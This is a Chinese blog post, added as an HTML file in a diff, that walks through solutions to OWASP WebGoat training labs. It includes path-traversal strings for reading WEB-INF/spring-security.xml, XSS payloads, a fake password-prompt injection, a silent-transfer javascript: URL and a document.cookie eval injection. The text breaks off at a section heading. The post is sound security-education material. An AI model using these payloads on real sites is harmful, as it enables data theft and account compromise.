@@ -1,0 +1,1387 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="WebGoat 是 OWASP 组织研制出的用于进行 web 漏洞实验的应用平台。自己搭了一个靶场练习了一下，这篇是我的练习记录（部分题意翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebGoat 靶场题解">
+<meta property="og:url" content="https://www.tr0y.wang/2018/04/06/WebGoat/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="WebGoat 是 OWASP 组织研制出的用于进行 web 漏洞实验的应用平台。自己搭了一个靶场练习了一下，这篇是我的练习记录（部分题意翻译">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
+<meta property="article:published_time" content="2018-04-06T11:09:36.000Z">
+<meta property="article:modified_time" content="2021-04-13T09:32:35.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
+  
+  
+  
+  <title>WebGoat 靶场题解 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WebGoat 靶场题解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-04-06 11:09" pubdate>
+          2018年4月6日 11:09:36
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          155 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="true"
+      >
+        过程记录
+        <span class="list-group-count">(30)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2017/10/31/RSA2016/" title="2016 全国高校密码数学挑战赛-赛题三"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2016 全国高校密码数学挑战赛-赛题三</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/05/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%84%9F%E8%A8%80/" title="2020 网鼎杯赛（zi）后（bi）感言"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2020 网鼎杯赛（zi）后（bi）感言</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/10/12/CBCByteFlippingAttack/" title="CBC 字节翻转攻击"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CBC 字节翻转攻击</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/04/29/CVE-2016-3714/" title="CVE-2016-3714 ImageTragick"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CVE-2016-3714 ImageTragick</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/05/18/CVE-2018-1111/" title="CVE-2018-1111 DynoRoot"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CVE-2018-1111 DynoRoot</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/08/07/CVE-2020-15778/" title="CVE-2020-15778：鸡肋的高危"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CVE-2020-15778：鸡肋的高危</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/10/11/crypto-course-week1/" title="Coursera 上密码学公开课的 week1"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Coursera 上密码学公开课的 week1</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/12/05/EX6a/" title="Cryptopals Challenge 43"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Cryptopals Challenge 43</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/12/05/EX6b/" title="Cryptopals Challenge 44"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Cryptopals Challenge 44</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/04/26/Discuz-v3-4-delete/" title="Discuz!(v3.4 及以下) 任意文件删除漏洞分析"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Discuz!(v3.4 及以下) 任意文件删除漏洞分析</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">WebGoat 靶场题解</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：4 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>WebGoat 是 OWASP 组织研制出的用于进行 web 漏洞实验的应用平台。自己搭了一个靶场练习了一下，这篇是我的练习记录（部分题意翻译</p>
+<span id="more"></span>
+<h1 id="webgoat-相关">WebGoat 相关</h1>
+<h2 id="介绍">介绍</h2>
+<p>WebGoat 是 OWASP 组织研制出的用于进行 web 漏洞实验的应用平台，用来说明 web 应用中存在的安全漏洞。WebGoat 运行在带有 java 虚拟机的平台之上，当前提供的训练课程有 30 多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话 cookie、SQL 盲注、数字型 SQL 注入、字符串型 SQL 注入、web 服务、Open Authentication 失效、危险的 HTML 注释等等。WebGoat 提供了一系列 web 安全学习的教程，某些课程也给出了视频演示，指导用户利用这些漏洞进行攻击。</p>
+<h2 id="安装">安装</h2>
+<p>我用的是 java，用 docker 也是一样的。</p>
+<p>现在已经出了 8.0 版的，不过貌似不太完善，所以我用的还是 7.1 版。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases?after=v8.0.0.M4">下载 webgoat-container-7.1-exec.jar</a></p>
+<p>然后直接运行</p>
+<p><code>sudo java -jar webgoat-server-&lt;&lt;version&gt;&gt;.jar</code></p>
+<p>当然，你也可以修改地址与端口（默认是 127.0.0.1:8080</p>
+<p><code>sudo java -jar webgoat-server-&lt;&lt;version&gt;&gt;.jar --server.port=9090 --server.address=x.x.x.x</code></p>
+<h1 id="关卡">关卡</h1>
+<h2 id="introduction">Introduction</h2>
+<h3 id="how-to-work-with-webgoat">How to work with WebGoat</h3>
+<p>一些介绍性的内容，简单看看即可</p>
+<h3 id="how-to-create-a-legacy-lesson">How to create a Legacy Lesson</h3>
+<p>一些介绍性的内容，简单看看即可</p>
+<h2 id="general">General</h2>
+<h3 id="http-basics">Http Basics</h3>
+<p>http 的简单演示，随便输入一个字符串，点击 <code>Go</code> 发给服务器，服务器会返回逆序的字符串</p>
+<h2 id="access-control-flaws">Access Control Flaws</h2>
+<h3 id="using-an-access-control-matrix">Using an Access Control Matrix</h3>
+<p>使用访问控制矩阵。在基于角色的访问控制方案中，角色表示一组访问权限和权限。用户可以被分配一个或多个角色。基于角色的访问控制方案通常由角色权限管理和角色分配两部分组成。基于角色的访问控制方案可能允许用户执行他/她分配的角色不允许的访问，或以某种方式允许向未授权角色提升权限。</p>
+<p>每个用户都是允许访问某些资源的角色的成员。您的目标是<strong>探索管理此网站的访问控制规则。</strong>只有[Admin]组才能访问“Account Manager”资源。</p>
+<p>一个一个试就好了，Larry 可以访问 <code>Account Manager</code></p>
+<h3 id="bypass-a-path-based-access-control-scheme">Bypass a Path Based Access Control Scheme</h3>
+<p>绕过路径访问控制方案</p>
+<p><code>webgoat</code> 用户可以访问 <code>lessonPlans/en</code> 目录中的所有文件。 尝试破坏访问控制机制并访问不在列出的目录中的资源。 选择要查看的文件后，WebGoat 将报告是否授予对文件的访问权限。 尝试获取的有趣文件可能是像 <code>WEB-INF/spring-security.xml</code> 这样的文件。 请记住，文件路径将根据 WebGoat 的启动方式而有所不同。</p>
+<p>现在我们要获取 WEB-INF/spring-security.xml 文件的内容。而 <code>../</code> 代表上一级目录，那么我们就可以逐级往上找：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br></code></pre></td></tr></table></figure>
+<p>（webgoat 推荐使用 ZAP，但是我更喜欢 burpsuit</p>
+<h3 id="lab-role-based-access-control">LAB: Role Based Access Control</h3>
+<h4 id="stage-1">Stage 1</h4>
+<p>作为普通员工“tom”，利用弱访问控制来使用“职员列表”页面中的“删除”功能。验证可以删除汤姆的个人资料。用户的密码是小写的给定名称（例如 Tom Cat 的密码是“tom”）。</p>
+<p>本来以为密码都是小写的用户名，直接登陆 admin 的帐号，删除 Tom 的帐号即可，没想到过不了。。题目应该指的是，Tom 自己删掉自己的用户（只能登陆自己的帐号</p>
+<p>抓一下删除的包可知，Post 为 <code>employee_id=105&amp;action=DeleteProfile</code></p>
+<p>在 Tom 登陆的时候改一下 action 参数就行了</p>
+<h4 id="stage-2">Stage 2</h4>
+<p>对 stage1 的漏洞进行修补。给思路吧：</p>
+<p>对于 <code>删除</code> 这种会造成严重后果的行为，应该再次输入密码以确认（如 Github</p>
+<p>但是要是 admin 的帐号密码泄露，那也没啥好说的了</p>
+<h4 id="stage-3">Stage 3</h4>
+<p>目标：作为普通员工“tom”，利用弱访问控制来查看其他员工的个人资料。</p>
+<p>登陆 Tom 的帐号，点击 ViewProfiles 的时候抓包，改 employee_id 即可</p>
+<h4 id="stage-4">Stage 4</h4>
+<p>对 Stage 3 的漏洞进行修补</p>
+<p>加 Cookie</p>
+<h2 id="ajax-security">AJAX Security</h2>
+<h3 id="lab-dom-based-cross-site-scripting">LAB: DOM-Based cross-site scripting</h3>
+<h4 id="stage-1-1">STAGE 1</h4>
+<p>文档对象模型（DOM）从安全的角度提出了一个有趣的问题。 它允许动态修改网页的内容，但恶意代码注入期间可能会被攻击者滥用。 当未经验证的用户输入直接用于修改客户端页面的内容时，XSS（一种恶意代码注入）可能发生。</p>
+<p>对于此练习，您的任务是使用此漏洞将恶意代码注入到 DOM 中。 然后在最后阶段，您将纠正代码中的缺陷以解决漏洞。</p>
+<p>DOM-XSS。查看源码中的 DOMXSS.js 可知，闭合 <code>&lt;h1&gt;</code> 即可</p>
+<p><code>&lt;h1&gt;&lt;img src='http://localhost:8080/WebGoat/images/logos/owasp.jpg'&lt;/img&gt;&lt;/h1&gt;</code></p>
+<h4 id="stage-2-1">STAGE 2</h4>
+<p>XSS，利用 JavaScript。且需要用到 onerror</p>
+<p>onerror 就 onerror 呗。。</p>
+<p><code>&lt;h1&gt;&lt;img onerror="alert(1)" src&gt;5&lt;img&gt;&lt;/h1&gt;</code></p>
+<h4 id="stage-3-1">STAGE 3</h4>
+<p>需要用 <code>iframe</code>。那就 <code>&lt;iframe javascript/onload</code></p>
+<p><code>&lt;h1&gt;&lt;iframe javascript/onload="alert('xss')"&gt;&lt;iframe&gt;&lt;/h1&gt;</code></p>
+<h4 id="stage-4-1">STAGE 4</h4>
+<p>伪造 Post Form</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>Please enter your password:<span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;I have your password: &#x27; + pass.value);&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="stage-5">STAGE 5</h4>
+<p>使用 <code>escape.js</code> 修复前面的漏洞</p>
+<h3 id="lab-client-side-filtering">LAB: Client Side Filtering</h3>
+<h4 id="stage-1-2">STAGE 1</h4>
+<p>阶段 1：您以山羊山金融公司（CSO）Moe Stooge 的身份登录。您可以访问公司信息中的每个人，除了 CEO，内维尔巴塞洛缪。或者至少你不应该访问 CEO 的信息。对于此练习，请检查页面的内容，以查看可以找到的额外信息。</p>
+<p>审查元素可找到</p>
+<h4 id="stage-2-2">STAGE 2</h4>
+<p>阶段 2：现在，解决问题。修改服务器只返回可以看到 Mustache 的结果。</p>
+<h3 id="dom-injection">DOM Injection</h3>
+<p><em>您的受害者是一个系统，需要一个激活码才能让您使用它。<br />
+</em>您的目标应该是尝试启用激活按钮。<br />
+*花一些时间查看 HTML 源代码，以了解密钥验证过程的工作原理。</p>
+<p>启用激活按钮，那么只需要 F12，然后找一下这个按钮是怎么被禁用的。可以发现 <code>&lt;input disabled</code></p>
+<p>删掉 <code>disabled</code> 就可以点击了</p>
+<h3 id="xml-injection">XML Injection</h3>
+<p>AJAX 应用程序使用 XML 与服务端进行信息交互。但该 XML 内容能够被非法用户轻易拦截并篡改。</p>
+<p>WebGoat-Miles 的 Miles 奖励显示了所有可用的奖金。一旦你成功登录自己的 ID，系统将显示出你的账号余额及可以购买的产品。你的目标是要尽量为自己添加更多的奖励。你的帐户 ID 是 8362390</p>
+<p>后台把兑换奖励所需奖金数额小于自己拥有的帐号余额的物品返回，然后显示在 html 中，而我们只需要抓包改 check 后面的数字即可</p>
+<p><code>check1004=on</code></p>
+<p>为什么是 1004 呢（1005 也可以），在 <code>xmlInjection.js</code> 里：</p>
+<p><code>strHTML = strHTML + '&lt;tr&gt;&lt;td&gt;&lt;input name=\"check' + (i + 1001) + '\" type=\"checkbox\"&gt;&lt;/td&gt;&lt;td&gt;';</code></p>
+<h3 id="json-injection">JSON Injection</h3>
+<p>JavaScript Object Notation (JSON)是一种简单的轻量级的数据交换格式，JSON 可以 以很多形式应用，如:数组，列表，哈希表和其他数据结构。JSON 广泛应用于 AJAX 和 web2.0 应用。相比 XML, JSON 得到程序员的更多的青睐，因为它使用更简单，速度更快。 但是与 XML 一样容易受到注入攻击，恶意攻击者可以通过在请求响应中注入任意值。</p>
+<p>你即将从 Boston(机场代码 BOS)飞往 Seattle(机场代码 SEA)。一旦你输入机场代码的三个字母后，浏览器将向服务端发送 AJAX 请求查询航班和机票价格。你将发现有两个航班可以选择:直达航班，价格贵;经停 2 次的转机航班，价格便宜。你的目标是:购买直达航班的机票，但要使用更便宜的价格。</p>
+<p>抓包即可。不过想当然地以为 <code>price2Submit</code> 也要改，没想到不用。</p>
+<h3 id="silent-transactions-attacks">Silent Transactions Attacks</h3>
+<p>静默交易攻击(Silent Transactions Attacks)</p>
+<p>对客户端来说，任何一个静默交易攻击，使用单一提交的系统都是有危险的。举例来说，如果一个正常的 web 应用允许一个简单的 URL 提交，一个预设会话攻击将允许攻击者在没有用户授权的情况下完成交易。在 Ajax 里情况会变得更糟糕:交易是不知不觉的，不会在页面上给用户反馈，所以注入的攻击脚本可以在用户未授权的情况下从客户端把钱偷走。</p>
+<p>这是一个简单的银行转账网页，在页面上可以进行转账操作; 当前页面显示了你的账号余额、当前账号和目标转账帐号; 该应用程序在通过一些基本验证后使用 AJAX 技术提交转账操作; 你的目标是绕过用户验证，执行静默转账操作。</p>
+<p>在 url 后面输入 <code>javascript:submitData(1234556,11000)</code> 即可</p>
+<p>其实这题就像一个反射型的 XSS，你可以把这个链接发给其他人，点击这个链接的人就会把钱转入你的帐号（因为没有任何验证</p>
+<h3 id="dangerous-use-of-eval">Dangerous Use of Eval</h3>
+<p>危险指令使用。在服务端验证所有用户输入的信息，这是一个不错的做法。如果未验证的用户输入直接通过 HTTP 响应返回给客户端的话，往往会触发 XSS 攻击。 在这一课中，未验证的用户提供的数据结合了 JavaScript 的 eval()调用一起使用。在反射型 XSS 攻击中，攻击者可以构造带有攻击脚本的 URL，将其存储于其他站点，通过电子邮件，或者其他方式诱骗用户点击，达到 XSS 的目的。HTML 网页有一系列的 HTML 编辑语言和字符组合完成。在源代码中任意位置添加一定的代码都有可能被浏览器解析，特别是 HTML 中的标记字符和属性等信息，如: <code>&lt;input name="submit" type="submit" value"提交"/&gt;</code></p>
+<p>本练习课程中，你的任务是通过构造特殊的输入，在应用程序运行过程中执行恶意脚本。要通过本课程，必须通过 alert()函数显示出 document.cookie</p>
+<p><code>digit access code</code> 可以弹：<code>');alert(document.cookie%2b'</code></p>
+<p><code>credit card number</code> 当然也可以弹，闭合麻烦了点就是了</p>
+<h3 id="insecure-client-storage">Insecure Client Storage</h3>
+<p>在服务端验证所有的用户输入信息总是不错的做法。客户端进行的任何验证信息都存在被逆向分析的脆弱性。记住，客户端的任何数据都不能被视为机密!</p>
+<p>客户端 HTML 和 JavaScrip 语句可以对网页内容、形式做修改，如隐藏、控制读写、限制长度等。同样，通过修改网页代码也能解除此类限制。</p>
+<h4 id="stage-1发现购物优惠码">Stage 1:发现购物优惠码</h4>
+<p>进入 <code>clientSideValidation.js</code> 看源码，发现 <code>isValidCoupon</code> 函数用于验证优惠码是否正确。那么我们把这一段和 <code>var coupons</code> 抠出来，加上 <code>alert(decrypted)</code>:</p>
+<p><code>PLATINUM GOLD SILVER BRONZE PRESSONE PRESSTWO</code> 随便填一个就行</p>
+<h4 id="stage-2提交免费订单">Stage 2:提交免费订单</h4>
+<p>由于商品列表中商品价格字段为只读，因此无法修改。现在你需要强制修改 redit card 以及 shopping card 中价格的属性。</p>
+<p>改 <code>GRANDTOT</code> 参数即可</p>
+<p>或者在 HTML 中找到 <code>readonly=""</code>，删除该属性，就可以在页面上修改商品价格了</p>
+<h3 id="same-origin-policy-protection">Same Origin Policy Protection</h3>
+<p>同源策略保护。本练习演示了同源策略保护。 XHR 请求只能传回原始服务器。 尝试将数据传递到非始发服务器将失败。</p>
+<p>进行尝试即可</p>
+<h2 id="authentication-flaws">Authentication Flaws</h2>
+<h3 id="password-strength">Password Strength</h3>
+<p>您的 Web 应用程序的帐户只与密码一样安全。 对于这个练习，你的工作是在 https://howsecureismypassword.net 上测试几个密码。 您必须同时测试所有 6 个密码...<br />
+在您的应用程序中，您应该设置好密码要求！</p>
+<p>这题答案和网站给出的不一样。。</p>
+<h3 id="forgot-password">Forgot Password</h3>
+<p>Web 应用程序经常为用户提供检索被遗忘密码的能力。 不幸的是，许多 Web 应用程序无法正确实现该机制。 验证用户身份所需的信息通常过于简单。</p>
+<p>总目标：</p>
+<p>如果用户可以正确回答秘密问题，用户可以检索他们的密码。 此“忘记密码”页面上没有锁定机制。 你的用户名是'webgoat'，你最喜欢的颜色是'红色'。 目标是检索另一个用户的密码。</p>
+<p>过于简单的验证问题+无锁定机制，那么就可以暴破</p>
+<p>手动试试几个常用的就可以试出来 <code>green</code></p>
+<h3 id="multi-level-login-2">Multi Level Login 2</h3>
+<p>你是一个叫 Joe 的攻击者。 您拥有 webgoat financial 的有效帐户。 你的目标是以 Jane 登录。 你的用户名是 Joe，你的密码是 banana。</p>
+<p>先用 Joe 的帐号登陆，在输入 Tank 后抓包，把 Joe 改为 Jane</p>
+<h3 id="multi-level-login-1">Multi Level Login 1</h3>
